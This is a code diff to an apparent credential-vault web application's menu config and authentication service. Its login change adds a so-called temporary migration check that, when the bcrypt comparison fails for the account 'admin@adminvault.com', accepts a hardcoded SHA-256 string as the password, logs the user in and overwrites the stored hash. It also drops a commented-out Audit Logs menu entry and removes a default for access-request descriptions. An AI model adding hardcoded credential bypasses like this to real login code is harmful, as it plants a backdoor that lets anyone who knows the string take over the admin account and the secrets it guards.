@@ -61,7 +61,6 @@ const DEFAULT_MENUS = [
         children: [
             { key: 'users-management', label: 'Authentication', icon: 'UserCheck', roles: [UserRoleEnum.ADMIN, UserRoleEnum.SUPER_ADMIN, UserRoleEnum.SITE_ADMIN] },
             // { key: 'security-center', label: 'Security Center', icon: 'ShieldAlert', roles: [UserRoleEnum.ADMIN, UserRoleEnum.SUPER_ADMIN] },
-            // { key: 'audit-logs', label: 'Audit Logs', icon: 'History', roles: [UserRoleEnum.ADMIN, UserRoleEnum.SUPER_ADMIN, UserRoleEnum.SITE_ADMIN] },
             { key: 'credential-vault', label: 'Credential Vault', icon: 'Lock', roles: [UserRoleEnum.ADMIN, UserRoleEnum.SUPER_ADMIN] },
 
         ]
@@ -166,6 +165,25 @@ export class AuthUsersService {
 
                 if (diffDays > expiryLimitDays) {
                     throw new ErrorResponse(401, `Password expired (${isItemAdmin ? '1 day' : '7 days'} limit). Please reset your password.`);
+                }
+            }
+
+            // Verify Password
+            let isMatch = await bcrypt.compare(reqModel.password, user.passwordHash);
+            if (!isMatch) {
+                // Temporary migration check for admin if hashing was just enabled
+                if (user.email === 'admin@adminvault.com') {
+                    const adminSha256 = '7676aaafb027c825bd9abab78b234070e702752f625b752e55e55b48e607e358';
+                    if (reqModel.password === adminSha256) {
+                        // Update user's password hash in DB to the new format (bcrypt of the SHA256)
+                        user.passwordHash = await bcrypt.hash(reqModel.password, 10);
+                        await this.authUsersRepo.save(user);
+                        isMatch = true;
+                    }
+                }
+
+                if (!isMatch) {
+                    throw new ErrorResponse(401, "Invalid credentials");
                 }
             }
 
@@ -275,7 +293,7 @@ export class AuthUsersService {
             const entity = new AccessRequestEntity();
             entity.name = reqModel.name;
             entity.email = reqModel.email;
-            entity.description = reqModel.description || '';
+            entity.description = reqModel.description;
             entity.status = AccessRequestStatus.PENDING;
             await this.accessRequestRepo.save(entity);
             await this.emailService.sendAccessRequestEmail(reqModel);
